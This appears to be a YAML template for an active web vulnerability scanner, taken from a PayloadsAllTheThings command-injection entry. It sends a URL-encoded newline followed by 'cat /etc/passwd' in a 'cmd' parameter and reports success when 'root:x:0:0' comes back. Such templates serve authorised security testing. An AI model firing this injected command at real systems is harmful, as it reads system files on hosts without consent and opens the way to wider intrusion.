id: patt-cmdi-nospace-03-cmd
name: 'PATT cmdi patt-cmdi-nospace-03 via cmd'
severity: critical
type: active
tags:
  - cmdi
  - patt
  - filterspace
description: 'PATT Bypass With Line Return: %0a as separator + space. [patt:patt-cmdi-nospace-03] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Command%20Injection/README.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cmd:
        - '%0acat%20/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
